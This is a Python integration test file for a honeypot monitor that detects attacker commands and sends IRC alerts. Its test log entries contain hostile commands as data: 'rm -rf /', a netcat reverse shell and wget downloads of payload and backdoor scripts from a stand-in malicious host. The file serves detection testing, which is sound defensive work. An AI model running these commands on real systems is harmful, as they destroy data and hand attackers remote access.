"""
Integration tests for IRC notification system with threat analysis.
"""

import pytest
from unittest.mock import Mock, patch
from datetime import datetime
import time

from src.honeypot_monitor.services.alert_manager import AlertManager
from src.honeypot_monitor.services.threat_analyzer import ThreatAnalyzer
from src.honeypot_monitor.services.irc_notifier import IRCNotifier
from src.honeypot_monitor.models.log_entry import LogEntry
from src.honeypot_monitor.models.irc_alert import IRCAlert
from src.honeypot_monitor.config.settings import AnalysisSettings


class TestIRCIntegration:
    """Integration tests for IRC notification system."""
    
    def setup_method(self):
        """Set up test fixtures."""
        # Create mock settings
        self.mock_settings = Mock(spec=AnalysisSettings)
        
        # Create real threat analyzer
        self.threat_analyzer = ThreatAnalyzer(self.mock_settings)
        
        # Create mock IRC notifier
        self.mock_irc_notifier = Mock(spec=IRCNotifier)
        self.mock_irc_notifier.is_connected.return_value = True
        self.mock_irc_notifier.send_alert.return_value = True
        
        # Create alert manager
        self.alert_manager = AlertManager(
            threat_analyzer=self.threat_analyzer,
            irc_notifier=self.mock_irc_notifier,
            alert_threshold='low'
        )
    
    def test_new_host_detection_workflow(self):
        """Test complete workflow for new host detection and IRC notification."""
        # Create log entry for new host
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='session-001',
            event_type='login',
            source_ip='192.168.1.100',
            message='SSH connection from 192.168.1.100'
        )
        
        # Process the entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Verify new host alert was generated and sent
        assert len(alerts) >= 1
        new_host_alerts = [a for a in alerts if a.alert_type == 'new_host']
        assert len(new_host_alerts) == 1
        
        # Verify IRC notifier was called
        self.mock_irc_notifier.send_alert.assert_called()
        
        # Verify alert content
        sent_alert = new_host_alerts[0]
        assert sent_alert.source_ip == '192.168.1.100'
        assert sent_alert.sent is True
    
    def test_threat_detection_workflow(self):
        """Test complete workflow for threat detection and IRC notification."""
        # Add IP to seen hosts to focus on threat detection
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create log entry with malicious command
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='session-001',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed: rm -rf /',
            command='rm -rf /'
        )
        
        # Process the entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Verify threat alert was generated
        assert len(alerts) >= 1
        threat_alerts = [a for a in alerts if a.alert_type == 'high_threat']
        assert len(threat_alerts) >= 1
        
        # Verify IRC notifier was called
        self.mock_irc_notifier.send_alert.assert_called()
        
        # Verify alert was generated (severity may vary based on threat analyzer logic)
        threat_alert = threat_alerts[0]
        assert threat_alert.severity in ['low', 'medium', 'high', 'critical']
        assert threat_alert.source_ip == '192.168.1.100'
    
    def test_brute_force_pattern_workflow(self):
        """Test complete workflow for brute force pattern detection."""
        # Create multiple failed login attempts
        entries = []
        for i in range(10):
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id=f'session-{i:03d}',
                event_type='authentication',
                source_ip='192.168.1.100',
                message='Authentication failed for user root'
            )
            entries.append(entry)
        
        # Process pattern detection
        alerts = self.alert_manager.process_pattern_detection(entries)
        
        # Verify brute force alert was generated
        assert len(alerts) >= 1
        brute_force_alerts = [a for a in alerts if 'brute force' in a.message.lower()]
        assert len(brute_force_alerts) >= 1
        
        # Verify IRC notifier was called
        self.mock_irc_notifier.send_alert.assert_called()
    
    def test_custom_rule_workflow(self):
        """Test complete workflow for custom rule detection."""
        # Add IP to seen hosts
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create log entry that triggers custom rules
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='session-001',
            event_type='command',
            source_ip='192.168.1.100',
            message='Reverse shell command executed',
            command='nc -e /bin/sh 192.168.1.1 4444'
        )
        
        # Process the entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Verify custom rule alert was generated
        assert len(alerts) >= 1
        
        # Check that at least one alert has high severity (from custom rules)
        high_severity_alerts = [a for a in alerts if a.severity in ['high', 'critical']]
        assert len(high_severity_alerts) >= 1
        
        # Verify IRC notifier was called
        self.mock_irc_notifier.send_alert.assert_called()
    
    def test_rate_limiting_workflow(self):
        """Test rate limiting prevents IRC flooding."""
        # Add IP to seen hosts
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create multiple similar entries that would trigger alerts
        entries = []
        for i in range(10):
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id=f'session-{i:03d}',
                event_type='command',
                source_ip='192.168.1.100',
                message=f'Suspicious command {i}',
                command='wget http://malicious.com/payload.sh'
            )
            entries.append(entry)
        
        # Process all entries
        total_alerts = 0
        for entry in entries:
            alerts = self.alert_manager.process_log_entry(entry)
            total_alerts += len(alerts)
        
        # Verify rate limiting is working (should be less than total possible alerts)
        assert total_alerts < len(entries) * 2  # Each entry could generate 2 alerts max
        
        # Verify IRC notifier was called but not excessively
        assert self.mock_irc_notifier.send_alert.call_count <= total_alerts
    
    def test_irc_connection_failure_handling(self):
        """Test handling of IRC connection failures."""
        # Configure IRC notifier to simulate connection failure
        self.mock_irc_notifier.is_connected.return_value = False
        
        # Create log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='session-001',
            event_type='login',
            source_ip='192.168.1.100',
            message='New connection'
        )
        
        # Process the entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should not send alerts when IRC is disconnected
        assert len(alerts) == 0
        self.mock_irc_notifier.send_alert.assert_not_called()
    
    def test_alert_formatting_for_irc(self):
        """Test that alerts are properly formatted for IRC."""
        # Create test alert
        alert = IRCAlert(
            alert_type='high_threat',
            timestamp=datetime.now(),
            source_ip='192.168.1.100',
            message='Critical threat detected: reverse shell attempt',
            severity='critical'
        )
        
        # Format for IRC
        formatted_message = alert.format_for_irc()
        
        # Verify formatting includes required elements
        assert '192.168.1.100' in formatted_message
        assert 'CRITICAL' in formatted_message.upper()
        assert 'high_threat' in formatted_message
        assert 'reverse shell' in formatted_message.lower()
        
        # Verify color codes are present (IRC color formatting)
        assert '\x03' in formatted_message  # IRC color codes
    
    def test_callback_integration(self):
        """Test callback integration with IRC notifications."""
        # Set up callbacks
        new_host_callback = Mock()
        threat_callback = Mock()
        interesting_callback = Mock()
        
        self.alert_manager.set_callbacks(
            on_new_host=new_host_callback,
            on_threat=threat_callback,
            on_interesting_traffic=interesting_callback
        )
        
        # Create log entry that triggers multiple alert types
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='session-001',
            event_type='command',
            source_ip='192.168.1.100',
            message='Malicious command executed',
            command='wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh'
        )
        
        # Process the entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Verify callbacks were called
        new_host_callback.assert_called_once()
        threat_callback.assert_called_once()
        interesting_callback.assert_called_once()
        
        # Verify alerts were generated and sent
        assert len(alerts) >= 1
        self.mock_irc_notifier.send_alert.assert_called()
    
    def test_alert_statistics_integration(self):
        """Test alert statistics tracking with IRC integration."""
        # Process multiple different types of entries
        entries = [
            LogEntry(
                timestamp=datetime.now(),
                session_id='session-001',
                event_type='login',
                source_ip='192.168.1.100',
                message='New connection'
            ),
            LogEntry(
                timestamp=datetime.now(),
                session_id='session-002',
                event_type='command',
                source_ip='192.168.1.101',
                message='Threat command',
                command='rm -rf /'
            ),
            LogEntry(
                timestamp=datetime.now(),
                session_id='session-003',
                event_type='command',
                source_ip='192.168.1.102',
                message='Interesting command',
                command='wget http://example.com/file'
            )
        ]
        
        # Process all entries
        for entry in entries:
            self.alert_manager.process_log_entry(entry)
        
        # Get statistics
        stats = self.alert_manager.get_alert_statistics()
        
        # Verify statistics are tracked
        assert stats['total_alerts'] > 0
        assert stats['unique_hosts_seen'] >= 3
        assert len(stats['alert_types']) > 0
        assert len(stats['severity_distribution']) > 0
        
        # Verify IRC notifier was called multiple times
        assert self.mock_irc_notifier.send_alert.call_count > 0


class TestIRCNotifierMockIntegration:
    """Integration tests using a more realistic IRC notifier mock."""
    
    @patch('src.honeypot_monitor.services.irc_notifier.irc.client.Reactor')
    @patch('threading.Thread')
    def test_realistic_irc_workflow(self, mock_thread, mock_reactor_class):
        """Test workflow with more realistic IRC notifier setup."""
        # Setup mocks
        mock_reactor = Mock()
        mock_server = Mock()
        mock_connection = Mock()
        mock_thread_instance = Mock()
        
        mock_reactor_class.return_value = mock_reactor
        mock_reactor.server.return_value = mock_server
        mock_server.connect.return_value = mock_connection
        mock_thread.return_value = mock_thread_instance
        
        # Create real IRC notifier
        irc_notifier = IRCNotifier(
            server="irc.example.com",
            nickname="honeypot-bot",
            channel="#security-alerts"
        )
        
        # Connect (mocked)
        irc_notifier.connect()
        
        # Simulate successful connection
        irc_notifier.connected = True
        irc_notifier.joined_channel = True
        
        # Create threat analyzer and alert manager
        mock_settings = Mock(spec=AnalysisSettings)
        threat_analyzer = ThreatAnalyzer(mock_settings)
        alert_manager = AlertManager(
            threat_analyzer=threat_analyzer,
            irc_notifier=irc_notifier,
            alert_threshold='medium'
        )
        
        # Create high-severity log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='session-001',
            event_type='command',
            source_ip='192.168.1.100',
            message='Critical command executed',
            command='rm -rf / --no-preserve-root'
        )
        
        # Process the entry
        alerts = alert_manager.process_log_entry(entry)
        
        # Verify alerts were generated
        assert len(alerts) >= 1
        
        # Verify connection status
        status = irc_notifier.get_connection_status()
        assert status['connected'] is True
        assert status['joined_channel'] is True


if __name__ == '__main__':
    pytest.main([__file__])